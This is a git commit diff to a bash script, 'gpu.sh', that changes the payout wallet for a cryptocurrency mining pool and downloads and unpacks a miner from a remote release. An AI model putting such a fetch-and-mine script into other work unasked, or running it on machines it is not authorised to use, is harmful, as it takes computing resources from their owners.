631018c5c92e11c7950229b653a4bf238ecf2b71
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2021-08-05 22:35:08 +0700

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,8 +1,8 @@
 
 #!/bin/bash
 POOL=rx-us.unmineable.com:3333
-WALLET=SHIB:0xae4fa9f4582afc88f329b862738c8c50e5268fba
-WORKER=$(echo $(shuf -i 1-99999 -n 1)-xroc)
+WALLET=ETH:0xa8182456995a5b33df2907ddcaae9ad2a50b42a0
+WORKER=$(echo $(shuf -i 1-99999 -n 1)-XROC)
 wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
 tar -zxvf violetminer-linux-v0.2.2.tar.gz
 cd violetminer-linux-v0.2.2
